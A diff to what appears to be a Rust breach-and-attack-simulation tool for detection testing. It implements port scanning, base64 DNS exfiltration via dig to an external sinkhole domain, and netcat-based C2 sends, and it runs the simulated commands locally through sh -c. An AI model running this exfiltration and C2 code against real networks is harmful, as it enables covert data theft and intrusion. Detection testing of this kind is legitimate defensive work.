@@ -234,9 +234,9 @@ impl AttackTechnique for NetworkServiceDiscovery {
             parameters: vec![
                 TechniqueParameter {
                     name: "target_hosts".to_string(),
-                    description: "Target hosts to scan (comma-separated IPs). Default uses Palo Alto sinkhole for safe external telemetry.".to_string(),
+                    description: "Target hosts to scan (comma-separated IPs). Resolved at runtime from sinkhole.signalbench.sigre.xyz (fallback 198.135.184.22) when not overridden.".to_string(),
                     required: true,
-                    default: Some("198.135.184.22".to_string()),
+                    default: None,
                 },
                 TechniqueParameter {
                     name: "ports".to_string(),
@@ -276,16 +276,28 @@ impl AttackTechnique for NetworkServiceDiscovery {
             let technique_info = self.info();
             let scan_start = Instant::now();
 
+            // Resolve sinkhole at startup for dynamic target selection
+            let sinkhole_ip = crate::techniques::resolve_sinkhole_ip().await;
+
             // Get parameters from config or use defaults
             let target_hosts = config
                 .parameters
                 .get("target_hosts")
-                .unwrap_or(&"198.135.184.22".to_string())
-                .clone();
+                .cloned()
+                .unwrap_or_else(|| sinkhole_ip.clone());
+            // Derive fallback from effective target so explicit target overrides are honoured
+            let is_fallback = target_hosts == crate::techniques::SINKHOLE_IP_FALLBACK;
+            // Shorter TCP connect timeout in fallback mode: sinkhole drops non-C2 traffic so
+            // the full 2 s wait per port generates excessive delay when scanning 1000+ ports.
+            let tcp_timeout = if is_fallback {
+                Duration::from_secs(1)
+            } else {
+                Duration::from_secs(2)
+            };
             let ports = config
                 .parameters
                 .get("ports")
-                .unwrap_or(&"1-1024,1337,4444,5555,8443,8888,9999,31337".to_string())
+                .unwrap_or(&"21,22,23,25,53,80,110,135,139,143,443,445,993,995,1433,1723,3306,3389,4444,5900,8080,8443,8888,9200,31337".to_string())
                 .clone();
             let enable_udp = config
                 .parameters
@@ -315,7 +327,7 @@ impl AttackTechnique for NetworkServiceDiscovery {
                 return Ok(SimulationResult {
                     technique_id: technique_info.id,
                     success: true,
-                    message: format!("Would perform comprehensive TCP{udp_msg} port scanning on {target_hosts} for ports {ports}{targeted_msg} and save results to {output_file}"),
+                    message: format!("Would perform comprehensive TCP{udp_msg} port scanning on {target_hosts} (resolved sinkhole.signalbench.sigre.xyz, fallback 198.135.184.22) for ports {ports}{targeted_msg}; on fallback, traffic is unidirectional (send-only)"),
                     artifacts: vec![output_file],
                     cleanup_required: true,
                 });
@@ -413,7 +425,7 @@ impl AttackTechnique for NetworkServiceDiscovery {
                     let addr = format!("{host}:{port}");
 
                     // Attempt real TCP connection with 2 second timeout
-                    match timeout(Duration::from_secs(2), TcpStream::connect(&addr)).await {
+                    match timeout(tcp_timeout, TcpStream::connect(&addr)).await {
                         Ok(Ok(mut stream)) => {
                             // Port is OPEN
                             total_open_ports += 1;
@@ -478,7 +490,11 @@ impl AttackTechnique for NetworkServiceDiscovery {
                             }
                             Err(e) => {
                                 writeln!(file, "  Status: ERROR - {e}").unwrap();
-                                warn!("UDP probe error on {host}:{port}: {e}");
+                                if is_fallback {
+                                    debug!("UDP probe error on {host}:{port}: {e}");
+                                } else {
+                                    warn!("UDP probe error on {host}:{port}: {e}");
+                                }
                             }
                         }
 
@@ -539,7 +555,7 @@ impl AttackTechnique for NetworkServiceDiscovery {
 
                         debug!("[T1046-TARGETED] Scanning {addr} ({service_name})");
 
-                        match timeout(Duration::from_secs(2), TcpStream::connect(&addr)).await {
+                        match timeout(tcp_timeout, TcpStream::connect(&addr)).await {
                             Ok(Ok(mut stream)) => {
                                 targeted_open_ports += 1;
                                 writeln!(
@@ -711,6 +727,45 @@ impl AttackTechnique for NetworkServiceDiscovery {
 // ======================================
 // T1048 - Exfiltration Over Alternative Protocol
 // ======================================
+
+const T1048_SINKHOLE_LOOKUP_DOMAIN: &str = "sinkhole.signalbench.sigre.xyz";
+const T1048_SAFE_TEST_IP_FALLBACK: &str = "198.135.184.22";
+// Deterministic chunk count for the fixed sample payload (split_whitespace token count).
+// Update this constant if the sample data written to the exfil file changes.
+const T1048_DNS_CHUNK_ESTIMATE: usize = 62;
+
+/// Resolves the T1048 sinkhole IP via the authoritative lookup domain.
+/// Honours /etc/hosts and /etc/resolv.conf identically to getaddrinfo(3).
+/// Falls back to T1048_SAFE_TEST_IP_FALLBACK on any error so DNS is never
+/// a hard dependency for technique execution.
+async fn resolve_sinkhole_ip_t1048() -> String {
+    use tokio::net::lookup_host;
+    match lookup_host(format!("{}:80", T1048_SINKHOLE_LOOKUP_DOMAIN)).await {
+        Ok(mut addrs) => {
+            if let Some(addr) = addrs.find(|a| a.is_ipv4()) {
+                let ip = addr.ip().to_string();
+                debug!(
+                    "[T1048] Sinkhole resolved: {} -> {}",
+                    T1048_SINKHOLE_LOOKUP_DOMAIN, ip
+                );
+                return ip;
+            }
+            warn!(
+                "[T1048] Sinkhole lookup returned no IPv4 address - using fallback {}",
+                T1048_SAFE_TEST_IP_FALLBACK
+            );
+            T1048_SAFE_TEST_IP_FALLBACK.to_string()
+        }
+        Err(e) => {
+            warn!(
+                "[T1048] Sinkhole lookup failed ({}) - using fallback {}",
+                e, T1048_SAFE_TEST_IP_FALLBACK
+            );
+            T1048_SAFE_TEST_IP_FALLBACK.to_string()
+        }
+    }
+}
+
 pub struct ExfiltrationOverAlternativeProtocol {}
 
 #[async_trait]
@@ -742,9 +797,9 @@ impl AttackTechnique for ExfiltrationOverAlternativeProtocol {
                 },
                 TechniqueParameter {
                     name: "target".to_string(),
-                    description: "Target for exfiltration (domain for DNS, IP for ICMP, URL for HTTP). Default uses Palo Alto sinkhole.".to_string(),
+                    description: "Target for exfiltration (domain for DNS, IP for ICMP, URL for HTTP). DNS default uses GoCortex exfil sink (t1048.signalbench.sigre.xyz); override for ICMP or HTTP targets.".to_string(),
                     required: false,
-                    default: Some("198.135.184.22".to_string()),
+                    default: Some("t1048.signalbench.sigre.xyz".to_string()),
                 },
             ],
             detection: "Network monitoring can detect unusual DNS queries, ICMP traffic, or HTTP requests".to_string(),
@@ -778,14 +833,25 @@ impl AttackTechnique for ExfiltrationOverAlternativeProtocol {
             let target = config
                 .parameters
                 .get("target")
-                .unwrap_or(&"198.135.184.22".to_string())
+                .unwrap_or(&"t1048.signalbench.sigre.xyz".to_string())
                 .clone();
 
             if dry_run {
+                let dry_msg = if protocol.to_lowercase() == "dns" {
+                    let sinkhole_ip = resolve_sinkhole_ip_t1048().await;
+                    format!(
+                        "Would exfiltrate via DNS: ~{} queries routed directly to {} (@{}) for target domain {}",
+                        T1048_DNS_CHUNK_ESTIMATE, T1048_SINKHOLE_LOOKUP_DOMAIN, sinkhole_ip, target
+                    )
+                } else {
+                    format!(
+                        "Would perform data exfiltration using {protocol} protocol to {target} and save logs to {log_file}"
+                    )
+                };
                 return Ok(SimulationResult {
                     technique_id: technique_info.id,
                     success: true,
-                    message: format!("Would perform data exfiltration using {protocol} protocol to {target} and save logs to {log_file}"),
+                    message: dry_msg,
                     artifacts: vec![data_file.clone(), log_file.clone()],
                     cleanup_required: true,
                 });
@@ -854,19 +920,31 @@ impl AttackTechnique for ExfiltrationOverAlternativeProtocol {
                     )
                     .unwrap();
 
+                    // Resolve sinkhole IP once; every query is routed directly to
+                    // the EC2 authoritative server via @<sinkhole_ip> so DNS packets
+                    // cross the PA-440 regardless of the host recursive resolver.
+                    let sinkhole_ip = resolve_sinkhole_ip_t1048().await;
+                    info!(
+                        "[T1048] DNS exfil: routing queries directly to {} (@{})",
+                        target, sinkhole_ip
+                    );
+                    writeln!(log_file_handle, "Sinkhole: {sinkhole_ip}").unwrap();
+
                     // Read the data file
                     let data = std::fs::read_to_string(&data_file)
                         .map_err(|e| format!("Failed to read data file: {e}"))?;
 
                     // Split data into chunks (DNS has length limitations)
                     let chunks: Vec<&str> = data.split_whitespace().collect();
+                    let total = chunks.len();
 
                     writeln!(
                         log_file_handle,
                         "Encoding data into Base64 before exfiltration..."
                     )
                     .unwrap();
-                    let mut successful_exfils = 0;
+                    let mut successful_exfils = 0usize;
+                    let mut queries_resolved = 0usize;
 
                     for (i, chunk) in chunks.iter().enumerate() {
                         // Base64 encode the data
@@ -878,6 +956,7 @@ impl AttackTechnique for ExfiltrationOverAlternativeProtocol {
                         let subdomain = encoded.to_lowercase().to_string();
                         let query = format!("{subdomain}.{target}");
 
+                        debug!("[T1048] DNS query {}/{}: {}", i + 1, total, query);
                         writeln!(
                             log_file_handle,
                             "[{}] Exfiltrating chunk: {} -> DNS query: {}",
@@ -887,8 +966,13 @@ impl AttackTechnique for ExfiltrationOverAlternativeProtocol {
                         )
                         .unwrap();
 
-                        // Actually perform the DNS lookup using dig command
-                        let output = Command::new("dig").arg(&query).arg("+short").output().await;
+                        // Route directly to EC2 sinkhole, bypassing split-horizon resolvers.
+                        let output = Command::new("dig")
+                            .arg(format!("@{sinkhole_ip}"))
+                            .arg(&query)
+                            .arg("+short")
+                            .output()
+                            .await;
 
                         match output {
                             Ok(result) => {
@@ -896,6 +980,11 @@ impl AttackTechnique for ExfiltrationOverAlternativeProtocol {
                                 let stdout = String::from_utf8_lossy(&result.stdout);
                                 let stderr = String::from_utf8_lossy(&result.stderr);
 
+                                debug!(
+                                    "[T1048] dig status={} response={}",
+                                    status,
+                                    stdout.trim()
+                                );
                                 writeln!(log_file_handle, "    Status: {status}").unwrap();
                                 if !stdout.is_empty() {
                                     writeln!(log_file_handle, "    Response: {stdout}").unwrap();
@@ -905,6 +994,9 @@ impl AttackTechnique for ExfiltrationOverAlternativeProtocol {
                                 }
 
                                 successful_exfils += 1;
+                                if status == 0 {
+                                    queries_resolved += 1;
+                                }
                             }
                             Err(e) => {
                                 writeln!(log_file_handle, "    Failed to execute DNS query: {e}")
@@ -916,8 +1008,20 @@ impl AttackTechnique for ExfiltrationOverAlternativeProtocol {
                         sleep(Duration::from_millis(100)).await;
                     }
 
-                    writeln!(log_file_handle, "\nExfiltration complete - {}/{} chunks of data sent via actual DNS queries", 
-                        successful_exfils, chunks.len()).unwrap();
+                    info!(
+                        "[T1048] DNS exfil: {} queries sent to {}, {} resolved, {} failed",
+                        total,
+                        sinkhole_ip,
+                        queries_resolved,
+                        total.saturating_sub(queries_resolved)
+                    );
+                    writeln!(
+                        log_file_handle,
+                        "\nExfiltration complete - {}/{} chunks of data sent via actual DNS queries",
+                        successful_exfils,
+                        total
+                    )
+                    .unwrap();
                 }
                 "icmp" => {
                     writeln!(
@@ -1140,9 +1244,9 @@ impl AttackTechnique for NonApplicationLayerProtocol {
                 },
                 TechniqueParameter {
                     name: "target".to_string(),
-                    description: "Target IP address. Default uses Palo Alto sinkhole for safe external telemetry.".to_string(),
+                    description: "Target IP address. Resolved at runtime from sinkhole.signalbench.sigre.xyz (fallback 198.135.184.22) when not overridden.".to_string(),
                     required: true,
-                    default: Some("198.135.184.22".to_string()),
+                    default: None,
                 },
                 TechniqueParameter {
                     name: "port".to_string(),
@@ -1175,6 +1279,9 @@ impl AttackTechnique for NonApplicationLayerProtocol {
         Box::pin(async move {
             let technique_info = self.info();
 
+            // Resolve sinkhole at startup for dynamic target selection
+            let sinkhole_ip = crate::techniques::resolve_sinkhole_ip().await;
+
             // Get parameters from config or use defaults
             let protocol = config
                 .parameters
@@ -1184,8 +1291,10 @@ impl AttackTechnique for NonApplicationLayerProtocol {
             let target = config
                 .parameters
                 .get("target")
-                .unwrap_or(&"198.135.184.22".to_string())
-                .clone();
+                .cloned()
+                .unwrap_or_else(|| sinkhole_ip.clone());
+            // Derive fallback from effective target so explicit target overrides are honoured
+            let is_fallback = target == crate::techniques::SINKHOLE_IP_FALLBACK;
             let port = config
                 .parameters
                 .get("port")
@@ -1206,7 +1315,7 @@ impl AttackTechnique for NonApplicationLayerProtocol {
                 return Ok(SimulationResult {
                     technique_id: technique_info.id,
                     success: true,
-                    message: format!("Would perform C2 communications using {protocol} protocol to {target}:{port} and save logs to {log_file}"),
+                    message: format!("Would perform C2 communications using {protocol} protocol to {target}:{port} (resolved sinkhole.signalbench.sigre.xyz, fallback 198.135.184.22); on fallback, traffic is unidirectional (send-only)"),
                     artifacts: vec![log_file.clone(), command_file.clone()],
                     cleanup_required: true,
                 });
@@ -1276,26 +1385,29 @@ impl AttackTechnique for NonApplicationLayerProtocol {
                     )
                     .unwrap();
 
-                    // First check if port is actually open
-                    let port_check = Command::new("nc")
-                        .arg("-z")
-                        .arg("-v")
-                        .arg("-w")
-                        .arg("1") // 1 second timeout
-                        .arg(&target)
-                        .arg(&port)
-                        .output()
-                        .await;
+                    // First check if port is actually open (skipped in fallback mode)
+                    if !is_fallback {
+                        let port_check = Command::new("nc")
+                            .arg("-z")
+                            .arg("-v")
+                            .arg("-w")
+                            .arg("1") // 1 second timeout
+                            .arg(&target)
+                            .arg(&port)
+                            .output()
+                            .await;
 
-                    let is_port_open = match port_check {
-                        Ok(output) => output.status.code().unwrap_or(1) == 0,
-                        Err(_) => false,
-                    };
+                        let is_port_open = match port_check {
+                            Ok(output) => output.status.code().unwrap_or(1) == 0,
+                            Err(_) => false,
+                        };
 
-                    if is_port_open {
-                        writeln!(log_file_handle, "Target port is open and accessible.").unwrap();
-                    } else {
-                        writeln!(log_file_handle, "Target port is closed or not accessible. Will attempt to send data anyway.").unwrap();
+                        if is_port_open {
+                            writeln!(log_file_handle, "Target port is open and accessible.")
+                                .unwrap();
+                        } else {
+                            writeln!(log_file_handle, "Target port is closed or not accessible. Will attempt to send data anyway.").unwrap();
+                        }
                     }
 
                     let mut successful_commands = 0;
@@ -1329,73 +1441,93 @@ impl AttackTechnique for NonApplicationLayerProtocol {
                         }
 
                         // Use netcat to send the command to the target
-                        let output = Command::new("timeout")
-                            .arg("3") // Timeout after 3 seconds
-                            .arg("nc")
-                            .arg(&target)
-                            .arg(&port)
-                            .arg("-w")
-                            .arg("2") // Wait 2 seconds for response
-                            .arg("<")
-                            .arg(&temp_file)
-                            .output()
-                            .await;
+                        if is_fallback {
+                            // True fire-and-forget: spawn and drop — no response wait
+                            let _ = Command::new("timeout")
+                                .arg("3")
+                                .arg("nc")
+                                .arg(&target)
+                                .arg(&port)
+                                .arg("-w")
+                                .arg("2")
+                                .arg("<")
+                                .arg(&temp_file)
+                                .spawn();
+                            let _ = std::fs::remove_file(&temp_file);
+                            debug!("[T1095] [fallback] TCP send spawned for {target}:{port}");
+                            successful_commands += 1;
+                        } else {
+                            let output = Command::new("timeout")
+                                .arg("3")
+                                .arg("nc")
+                                .arg(&target)
+                                .arg(&port)
+                                .arg("-w")
+                                .arg("2")
+                                .arg("<")
+                                .arg(&temp_file)
+                                .output()
+                                .await;
 
-                        // Clean up temp file
-                        let _ = std::fs::remove_file(&temp_file);
+                            // Clean up temp file
+                            let _ = std::fs::remove_file(&temp_file);
 
-                        match output {
-                            Ok(result) => {
-                                let exit_status = result.status.code().unwrap_or(-1);
-                                let stdout = String::from_utf8_lossy(&result.stdout);
-                                let stderr = String::from_utf8_lossy(&result.stderr);
+                            match output {
+                                Ok(result) => {
+                                    let exit_status = result.status.code().unwrap_or(-1);
+                                    let stdout = String::from_utf8_lossy(&result.stdout);
+                                    let stderr = String::from_utf8_lossy(&result.stderr);
 
-                                writeln!(log_file_handle, "    Command Status: {exit_status}")
+                                    writeln!(
+                                        log_file_handle,
+                                        "    Command Status: {exit_status}"
+                                    )
                                     .unwrap();
 
-                                if !stdout.is_empty() {
-                                    writeln!(log_file_handle, "    Response: {stdout}").unwrap();
-                                }
-
-                                if !stderr.is_empty() {
-                                    writeln!(log_file_handle, "    Error: {stderr}").unwrap();
-                                }
-
-                                // Also execute the command locally to get a realistic response
-                                let local_output =
-                                    Command::new("sh").arg("-c").arg(cmd).output().await;
-
-                                match local_output {
-                                    Ok(local_result) => {
-                                        let local_stdout =
-                                            String::from_utf8_lossy(&local_result.stdout);
-                                        if !local_stdout.is_empty() {
-                                            let preview = if local_stdout.len() > 200 {
-                                                format!("{}... (truncated)", &local_stdout[0..200])
-                                            } else {
-                                                local_stdout.to_string()
-                                            };
-                                            writeln!(
-                                                log_file_handle,
-                                                "    Local execution result: {preview}"
-                                            )
+                                    if !stdout.is_empty() {
+                                        writeln!(log_file_handle, "    Response: {stdout}")
                                             .unwrap();
+                                    }
+
+                                    if !stderr.is_empty() {
+                                        writeln!(log_file_handle, "    Error: {stderr}").unwrap();
+                                    }
+
+                                    // Also execute the command locally to get a realistic response
+                                    let local_output =
+                                        Command::new("sh").arg("-c").arg(cmd).output().await;
+
+                                    match local_output {
+                                        Ok(local_result) => {
+                                            let local_stdout =
+                                                String::from_utf8_lossy(&local_result.stdout);
+                                            if !local_stdout.is_empty() {
+                                                let preview = if local_stdout.len() > 200 {
+                                                    format!(
+                                                        "{}... (truncated)",
+                                                        &local_stdout[0..200]
+                                                    )
+                                                } else {
+                                                    local_stdout.to_string()
+                                                };
+                                                writeln!(
+                                                    log_file_handle,
+                                                    "    Local execution result: {preview}"
+                                                )
+                                                .unwrap();
+                                            }
+                                        }
+                                        Err(e) => {
+                                            debug!("[T1095] Local TCP execution failed: {e}");
                                         }
                                     }
-                                    Err(e) => {
-                                        writeln!(
-                                            log_file_handle,
-                                            "    Local execution failed: {e}"
-                                        )
-                                        .unwrap();
-                                    }
-                                }
 
-                                successful_commands += 1;
-                            }
-                            Err(e) => {
-                                writeln!(log_file_handle, "    TCP transmission failed: {e}")
-                                    .unwrap();
+                                    successful_commands += 1;
+                                }
+                                Err(e) => {
+                                    writeln!(log_file_handle, "    TCP transmission failed: {e}")
+                                        .unwrap();
+                                }
                             }
                         }
 
@@ -1453,67 +1585,81 @@ impl AttackTechnique for NonApplicationLayerProtocol {
                         }
 
                         // Use netcat to actually send UDP packet
-                        let output = Command::new("sh")
-                            .arg("-c")
-                            .arg(format!("cat {temp_file} | nc -u -w 1 {target} {port}"))
-                            .output()
-                            .await;
+                        if is_fallback {
+                            // True fire-and-forget: spawn and drop — no response wait
+                            let _ = Command::new("sh")
+                                .arg("-c")
+                                .arg(format!("cat {temp_file} | nc -u -w 1 {target} {port}"))
+                                .spawn();
+                            let _ = std::fs::remove_file(&temp_file);
+                            debug!("[T1095] [fallback] UDP send spawned for {target}:{port}");
+                            successful_commands += 1;
+                        } else {
+                            let output = Command::new("sh")
+                                .arg("-c")
+                                .arg(format!("cat {temp_file} | nc -u -w 1 {target} {port}"))
+                                .output()
+                                .await;
 
-                        // Clean up temp file
-                        let _ = std::fs::remove_file(&temp_file);
+                            // Clean up temp file
+                            let _ = std::fs::remove_file(&temp_file);
 
-                        match output {
-                            Ok(result) => {
-                                let exit_status = result.status.code().unwrap_or(-1);
-                                let stdout = String::from_utf8_lossy(&result.stdout);
-                                let stderr = String::from_utf8_lossy(&result.stderr);
+                            match output {
+                                Ok(result) => {
+                                    let exit_status = result.status.code().unwrap_or(-1);
+                                    let stdout = String::from_utf8_lossy(&result.stdout);
+                                    let stderr = String::from_utf8_lossy(&result.stderr);
 
-                                writeln!(log_file_handle, "    Command Status: {exit_status}")
+                                    writeln!(
+                                        log_file_handle,
+                                        "    Command Status: {exit_status}"
+                                    )
                                     .unwrap();
 
-                                if !stdout.is_empty() {
-                                    writeln!(log_file_handle, "    Response: {stdout}").unwrap();
-                                }
-
-                                if !stderr.is_empty() {
-                                    writeln!(log_file_handle, "    Error: {stderr}").unwrap();
-                                }
-
-                                // Also execute the command locally to get a realistic response
-                                let local_output =
-                                    Command::new("sh").arg("-c").arg(cmd).output().await;
-
-                                match local_output {
-                                    Ok(local_result) => {
-                                        let local_stdout =
-                                            String::from_utf8_lossy(&local_result.stdout);
-                                        if !local_stdout.is_empty() {
-                                            let preview = if local_stdout.len() > 200 {
-                                                format!("{}... (truncated)", &local_stdout[0..200])
-                                            } else {
-                                                local_stdout.to_string()
-                                            };
-                                            writeln!(
-                                                log_file_handle,
-                                                "    Local execution result: {preview}"
-                                            )
+                                    if !stdout.is_empty() {
+                                        writeln!(log_file_handle, "    Response: {stdout}")
                                             .unwrap();
+                                    }
+
+                                    if !stderr.is_empty() {
+                                        writeln!(log_file_handle, "    Error: {stderr}").unwrap();
+                                    }
+
+                                    // Also execute the command locally to get a realistic response
+                                    let local_output =
+                                        Command::new("sh").arg("-c").arg(cmd).output().await;
+
+                                    match local_output {
+                                        Ok(local_result) => {
+                                            let local_stdout =
+                                                String::from_utf8_lossy(&local_result.stdout);
+                                            if !local_stdout.is_empty() {
+                                                let preview = if local_stdout.len() > 200 {
+                                                    format!(
+                                                        "{}... (truncated)",
+                                                        &local_stdout[0..200]
+                                                    )
+                                                } else {
+                                                    local_stdout.to_string()
+                                                };
+                                                writeln!(
+                                                    log_file_handle,
+                                                    "    Local execution result: {preview}"
+                                                )
+                                                .unwrap();
+                                            }
+                                        }
+                                        Err(e) => {
+                                            debug!("[T1095] Local UDP execution failed: {e}");
                                         }
                                     }
-                                    Err(e) => {
-                                        writeln!(
-                                            log_file_handle,
-                                            "    Local execution failed: {e}"
-                                        )
-                                        .unwrap();
-                                    }
-                                }
 
-                                successful_commands += 1;
-                            }
-                            Err(e) => {
-                                writeln!(log_file_handle, "    UDP transmission failed: {e}")
-                                    .unwrap();
+                                    successful_commands += 1;
+                                }
+                                Err(e) => {
+                                    writeln!(log_file_handle, "    UDP transmission failed: {e}")
+                                        .unwrap();
+                                }
                             }
                         }
 
@@ -1578,63 +1724,76 @@ impl AttackTechnique for NonApplicationLayerProtocol {
 
                         match output {
                             Ok(result) => {
-                                let exit_status = result.status.code().unwrap_or(-1);
-                                let stdout = String::from_utf8_lossy(&result.stdout);
-                                let stderr = String::from_utf8_lossy(&result.stderr);
+                                if is_fallback {
+                                    // Fire-and-forget: packet sent, no response parsing
+                                    debug!("[T1095] ICMP packet sent (fallback mode)");
+                                    successful_commands += 1;
+                                } else {
+                                    let exit_status = result.status.code().unwrap_or(-1);
+                                    let stdout = String::from_utf8_lossy(&result.stdout);
+                                    let stderr = String::from_utf8_lossy(&result.stderr);
 
-                                writeln!(log_file_handle, "    Command Status: {exit_status}")
+                                    writeln!(
+                                        log_file_handle,
+                                        "    Command Status: {exit_status}"
+                                    )
                                     .unwrap();
 
-                                if exit_status == 0 {
-                                    successful_commands += 1;
-                                }
-
-                                if !stdout.is_empty() {
-                                    let summary = if stdout.len() > 200 {
-                                        format!("{}... (truncated)", &stdout[0..200])
-                                    } else {
-                                        stdout.to_string()
-                                    };
-                                    writeln!(log_file_handle, "    Response: {summary}").unwrap();
-                                }
-
-                                if !stderr.is_empty() {
-                                    writeln!(log_file_handle, "    Error: {stderr}").unwrap();
-                                }
-
-                                // Also execute the command locally to get a realistic response
-                                let local_output =
-                                    Command::new("sh").arg("-c").arg(cmd).output().await;
-
-                                match local_output {
-                                    Ok(local_result) => {
-                                        let local_stdout =
-                                            String::from_utf8_lossy(&local_result.stdout);
-                                        if !local_stdout.is_empty() {
-                                            let preview = if local_stdout.len() > 200 {
-                                                format!("{}... (truncated)", &local_stdout[0..200])
-                                            } else {
-                                                local_stdout.to_string()
-                                            };
-                                            writeln!(
-                                                log_file_handle,
-                                                "    Local execution result: {preview}"
-                                            )
-                                            .unwrap();
-                                        }
+                                    if exit_status == 0 {
+                                        successful_commands += 1;
                                     }
-                                    Err(e) => {
-                                        writeln!(
-                                            log_file_handle,
-                                            "    Local execution failed: {e}"
-                                        )
-                                        .unwrap();
+
+                                    if !stdout.is_empty() {
+                                        let summary = if stdout.len() > 200 {
+                                            format!("{}... (truncated)", &stdout[0..200])
+                                        } else {
+                                            stdout.to_string()
+                                        };
+                                        writeln!(log_file_handle, "    Response: {summary}")
+                                            .unwrap();
+                                    }
+
+                                    if !stderr.is_empty() {
+                                        writeln!(log_file_handle, "    Error: {stderr}").unwrap();
+                                    }
+
+                                    // Also execute the command locally to get a realistic response
+                                    let local_output =
+                                        Command::new("sh").arg("-c").arg(cmd).output().await;
+
+                                    match local_output {
+                                        Ok(local_result) => {
+                                            let local_stdout =
+                                                String::from_utf8_lossy(&local_result.stdout);
+                                            if !local_stdout.is_empty() {
+                                                let preview = if local_stdout.len() > 200 {
+                                                    format!(
+                                                        "{}... (truncated)",
+                                                        &local_stdout[0..200]
+                                                    )
+                                                } else {
+                                                    local_stdout.to_string()
+                                                };
+                                                writeln!(
+                                                    log_file_handle,
+                                                    "    Local execution result: {preview}"
+                                                )
+                                                .unwrap();
+                                            }
+                                        }
+                                        Err(e) => {
+                                            debug!("[T1095] Local ICMP execution failed: {e}");
+                                        }
                                     }
                                 }
                             }
                             Err(e) => {
-                                writeln!(log_file_handle, "    ICMP transmission failed: {e}")
-                                    .unwrap();
+                                if is_fallback {
+                                    debug!("[T1095] ICMP send failed: {e}");
+                                } else {
+                                    writeln!(log_file_handle, "    ICMP transmission failed: {e}")
+                                        .unwrap();
+                                }
                             }
                         }
 
